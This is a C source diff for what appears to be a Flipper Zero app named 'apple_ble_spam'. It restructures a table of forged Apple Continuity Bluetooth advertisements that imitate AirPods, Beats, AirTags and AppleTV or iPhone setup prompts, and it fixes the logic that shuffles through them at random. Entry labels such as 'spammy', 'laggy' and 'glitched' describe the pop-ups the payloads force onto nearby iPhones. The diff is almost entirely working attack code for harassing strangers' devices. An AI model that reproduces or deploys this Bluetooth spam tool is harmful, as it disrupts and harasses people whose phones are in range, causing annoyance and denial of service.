@@ -17,284 +17,327 @@ typedef struct {
 // Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/
 // Custom adv logic and Airtag ID from https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/
 
-static Payload
-    payloads[] =
-        {
-            [ContinuityTypeNearbyAction] =
-                {.title = "Random Action",
-                 .text = "Spam shuffle Nearby Actions",
-                 .random = true,
-                 .msg =
-                     {
-                         .type = ContinuityTypeNearbyAction,
-                         .data = {.nearby_action = {.type = 0x00}},
-                     }},
-            [ContinuityTypeProximityPair] =
-                {.title = "Random Pair",
-                 .text = "Spam shuffle Proximity Pairs",
-                 .random = true,
-                 .msg =
-                     {
-                         .type = ContinuityTypeProximityPair,
-                         .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
-                     }},
-            {.title = "AirPods Pro",
-             .text = "Modal, spammy (auto close)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0E20}},
-                 }},
-            {.title = "Beats Solo 3",
-             .text = "Modal, spammy (stays open)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0620}},
-                 }},
-            {.title = "AirPods Max",
-             .text = "Modal, laggy (stays open)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0A20}},
-                 }},
-            {.title = "Beats Flex",
-             .text = "Modal, laggy (stays open)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1020}},
-                 }},
-            {.title = "Airtag",
-             .text = "Modal, unlocked",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0055}},
-                 }},
-            {.title = "Hermes Airtag",
+static Payload payloads[] = {
+#if false
+            {.title = "AirDrop",
              .text = "",
              .random = false,
              .msg =
                  {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0030}},
+                     .type = ContinuityTypeAirDrop,
+                     .data = {.airdrop = {}},
                  }},
-            {.title = "AppleTV AutoFill",
-             .text = "Banner, unlocked, long range",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x13}},
-                 }},
-            {.title = "AppleTV Connecting...",
-             .text = "Modal, unlocked, long range",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x27}},
-                 }},
-            {.title = "AppleTV Audio Sync",
-             .text = "Banner, locked, long range",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x19}},
-                 }},
-            {.title = "AppleTV Color Balance",
-             .text = "Banner, locked",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x1E}},
-                 }},
-            {.title = "Setup New iPhone",
-             .text = "Modal, locked",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x09}},
-                 }},
-            {.title = "Transfer Phone Number",
-             .text = "Modal, locked",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x02}},
-                 }},
-            {.title = "Pair AppleTV",
-             .text = "Modal, unlocked",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x06}},
-                 }},
-            {.title = "HomePod Setup",
-             .text = "Modal, unlocked",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x0B}},
-                 }},
-            {.title = "AirPods",
-             .text = "Modal, spammy (auto close)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0220}},
-                 }},
-            {.title = "AirPods 2nd Gen",
-             .text = "Modal, spammy (auto close)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0F20}},
-                 }},
-            {.title = "AirPods 3rd Gen",
-             .text = "Modal, spammy (auto close)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1320}},
-                 }},
-            {.title = "AirPods Pro 2nd Gen",
-             .text = "Modal, spammy (auto close)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1420}},
-                 }},
-            {.title = "Powerbeats 3",
-             .text = "Modal, spammy (stays open)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0320}},
-                 }},
-            {.title = "Powerbeats Pro",
-             .text = "Modal, spammy (auto close)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0B20}},
-                 }},
-            {.title = "Beats Solo Pro",
+            {.title = "Airplay Target",
              .text = "",
              .random = false,
              .msg =
                  {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0C20}},
+                     .type = ContinuityTypeAirplayTarget,
+                     .data = {.airplay_target = {}},
                  }},
-            {.title = "Beats Studio Buds",
+            {.title = "Handoff",
              .text = "",
              .random = false,
              .msg =
                  {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1120}},
+                     .type = ContinuityTypeHandoff,
+                     .data = {.handoff = {}},
                  }},
-            {.title = "Beats X",
-             .text = "Modal, spammy (stays open)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0520}},
-                 }},
-            {.title = "Beats Studio 3",
-             .text = "Modal, spammy (stays open)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0920}},
-                 }},
-            {.title = "Beats Studio Pro",
-             .text = "Modal, spammy (stays open)",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1720}},
-                 }},
-            {.title = "Beats Fit Pro",
+            {.title = "Tethering Source",
              .text = "",
              .random = false,
              .msg =
                  {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1220}},
+                     .type = ContinuityTypeTetheringSource,
+                     .data = {.tethering_source = {}},
                  }},
-            {.title = "Beats Studio Buds+",
-             .text = "",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeProximityPair,
-                     .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1620}},
-                 }},
-            {.title = "Setup New AppleTV",
-             .text = "Modal, unlocked",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x01}},
-                 }},
-            {.title = "HomeKit AppleTV Setup",
-             .text = "Modal, unlocked",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x0D}},
-                 }},
-            {.title = "Join This AppleTV?",
-             .text = "Modal, unlocked",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x20}},
-                 }},
-            {.title = "AppleID for AppleTV?",
-             .text = "Modal, unlocked",
-             .random = false,
-             .msg =
-                 {
-                     .type = ContinuityTypeNearbyAction,
-                     .data = {.nearby_action = {.type = 0x2B}},
-                 }},
+#endif
+    {.title = "Random Action",
+     .text = "Spam shuffle Nearby Actions",
+     .random = true,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x00}},
+         }},
+    {.title = "Dismiss Active Actions",
+     .text = "Close current Nearby Actions",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0x00, .type = 0x00}},
+         }},
+    {.title = "AppleTV AutoFill",
+     .text = "Banner, unlocked, long range",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x13}},
+         }},
+    {.title = "AppleTV Connecting...",
+     .text = "Modal, unlocked, long range",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x27}},
+         }},
+    {.title = "Join This AppleTV?",
+     .text = "Modal, unlocked, spammy",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xBF, .type = 0x20}},
+         }},
+    {.title = "AppleTV Audio Sync",
+     .text = "Banner, locked, long range",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x19}},
+         }},
+    {.title = "AppleTV Color Balance",
+     .text = "Banner, locked",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x1E}},
+         }},
+    {.title = "Setup New iPhone",
+     .text = "Modal, locked",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x09}},
+         }},
+    {.title = "Setup New Random",
+     .text = "Modal, locked, glitched",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0x40, .type = 0x09}},
+         }},
+    {.title = "Transfer Phone Number",
+     .text = "Modal, locked",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x02}},
+         }},
+    {.title = "HomePod Setup",
+     .text = "Modal, unlocked",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0B}},
+         }},
+    {.title = "Random Pair",
+     .text = "Spam shuffle Proximity Pairs",
+     .random = true,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
+         }},
+    {.title = "AirPods Pro",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0E20}},
+         }},
+    {.title = "Beats Solo 3",
+     .text = "Modal, spammy (stays open)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0620}},
+         }},
+    {.title = "AirPods Max",
+     .text = "Modal, laggy (stays open)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0A20}},
+         }},
+    {.title = "Beats Flex",
+     .text = "Modal, laggy (stays open)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1020}},
+         }},
+    {.title = "Airtag",
+     .text = "Modal, unlocked",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0055}},
+         }},
+    {.title = "Hermes Airtag",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0030}},
+         }},
+    {.title = "Setup New AppleTV",
+     .text = "Modal, unlocked",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x01}},
+         }},
+    {.title = "Pair AppleTV",
+     .text = "Modal, unlocked",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x06}},
+         }},
+    {.title = "HomeKit AppleTV Setup",
+     .text = "Modal, unlocked",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0D}},
+         }},
+    {.title = "AppleID for AppleTV?",
+     .text = "Modal, unlocked",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.flags = 0xC0, .type = 0x2B}},
+         }},
+    {.title = "AirPods",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0220}},
+         }},
+    {.title = "AirPods 2nd Gen",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0F20}},
+         }},
+    {.title = "AirPods 3rd Gen",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1320}},
+         }},
+    {.title = "AirPods Pro 2nd Gen",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1420}},
+         }},
+    {.title = "Powerbeats 3",
+     .text = "Modal, spammy (stays open)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0320}},
+         }},
+    {.title = "Powerbeats Pro",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0B20}},
+         }},
+    {.title = "Beats Solo Pro",
+     .text = "",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0C20}},
+         }},
+    {.title = "Beats Studio Buds",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1120}},
+         }},
+    {.title = "Beats X",
+     .text = "Modal, spammy (stays open)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0520}},
+         }},
+    {.title = "Beats Studio 3",
+     .text = "Modal, spammy (stays open)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0920}},
+         }},
+    {.title = "Beats Studio Pro",
+     .text = "Modal, spammy (stays open)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1720}},
+         }},
+    {.title = "Beats Fit Pro",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1220}},
+         }},
+    {.title = "Beats Studio Buds+",
+     .text = "Modal, spammy (auto close)",
+     .random = false,
+     .msg =
+         {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1620}},
+         }},
 };
 
 struct {
     size_t count;
-    ContinuityData** data;
-} randoms[ContinuityTypeCount] = {
-    [ContinuityTypeNearbyAction] = {0, NULL},
-    [ContinuityTypeProximityPair] = {0, NULL},
-};
+    ContinuityData** datas;
+} randoms[ContinuityTypeCount] = {0};
 
 typedef struct {
     bool advertising;
@@ -314,7 +357,7 @@ static int32_t adv_thread(void* ctx) {
     while(state->advertising) {
         if(payload->random) {
             size_t random_i = rand() % randoms[type].count;
-            memcpy(&msg->data, randoms[type].data[random_i], sizeof(msg->data));
+            memcpy(&msg->data, randoms[type].datas[random_i], sizeof(msg->data));
         }
         continuity_generate_packet(msg, state->packet);
         furi_hal_bt_set_custom_adv_data(state->packet, state->size);
@@ -329,10 +372,10 @@ static void toggle_adv(State* state, Payload* payload) {
         furi_thread_flags_set(furi_thread_get_id(state->thread), true);
         furi_thread_join(state->thread);
         state->payload = NULL;
+        furi_hal_bt_set_custom_adv_data(NULL, 0);
         free(state->packet);
         state->packet = NULL;
         state->size = 0;
-        furi_hal_bt_set_custom_adv_data(NULL, 0);
     } else {
         state->size = continuity_get_packet_size(payload->msg.type);
         state->packet = malloc(state->size);
@@ -384,15 +427,18 @@ static void input_callback(InputEvent* input, void* ctx) {
 
 int32_t apple_ble_spam(void* p) {
     UNUSED(p);
-    for(size_t payload_i = ContinuityTypeCount; payload_i < COUNT_OF(payloads); payload_i++) {
+    for(size_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
+        if(payloads[payload_i].random) continue;
         randoms[payloads[payload_i].msg.type].count++;
     }
-    for(size_t random_i = 0; random_i < ContinuityTypeCount; random_i++) {
-        randoms[random_i].data = malloc(sizeof(ContinuityData*) * randoms[random_i].count);
-        size_t data_i = 0;
-        for(size_t payload_i = ContinuityTypeCount; payload_i < COUNT_OF(payloads); payload_i++) {
-            if(payloads[payload_i].msg.type == random_i) {
-                randoms[random_i].data[data_i++] = &payloads[payload_i].msg.data;
+    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
+        if(!randoms[type].count) continue;
+        randoms[type].datas = malloc(sizeof(ContinuityData*) * randoms[type].count);
+        size_t random_i = 0;
+        for(size_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
+            if(payloads[payload_i].random) continue;
+            if(payloads[payload_i].msg.type == type) {
+                randoms[type].datas[random_i++] = &payloads[payload_i].msg.data;
             }
         }
     }
@@ -464,8 +510,8 @@ int32_t apple_ble_spam(void* p) {
     furi_thread_free(state->thread);
     free(state);
 
-    for(size_t random_i = 0; random_i < ContinuityTypeCount; random_i++) {
-        free(randoms[random_i].data);
+    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
+        free(randoms[type].datas);
     }
     return 0;
 }
